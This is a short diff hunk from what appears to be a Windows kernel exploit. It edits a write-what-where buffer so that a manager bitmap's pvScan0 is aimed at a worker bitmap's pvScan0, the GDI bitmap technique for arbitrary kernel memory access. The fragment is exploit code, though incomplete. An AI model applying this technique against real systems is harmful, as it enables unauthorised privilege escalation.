@@ -313,7 +313,7 @@ main(
 
 	LPVOID wPtr = VirtualAlloc(0, sizeof(LPVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	memcpy(wPtr, &workerBitmap.pvScan0, sizeof(LPVOID));
-	memcpy(Buff, &whatPointerAddr, sizeof(LPVOID));
+	memcpy(Buff, &wPtr, sizeof(LPVOID));
 	memcpy(Buff + 8, &managerBitmap.pvScan0, sizeof(LPVOID));
 
 	DWORD u = 0;
